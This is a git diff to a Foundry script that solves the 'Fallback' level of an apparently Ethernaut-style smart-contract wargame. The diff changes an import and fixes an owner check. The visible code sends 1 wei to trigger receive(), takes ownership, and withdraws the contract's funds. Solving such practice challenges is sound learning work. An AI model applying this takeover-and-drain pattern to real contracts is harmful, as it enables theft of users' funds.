@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "../src/level1.sol";
+import { Fallback } from "../src/level1.sol";
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
 
@@ -17,7 +17,7 @@ contract Level1Solution is Script {
         // Send ether by call() will trigger the receive() function
         address(level).call{value: 1 wei}("");
         
-        if(owner == vm.envAddress("MY_ADDRESS")){
+        if(level.owner() == vm.envAddress("MY_ADDRESS")){
             level.withdraw();
             console.log("Withdrawal completed.");
             console.log("New owner: ", level.owner());
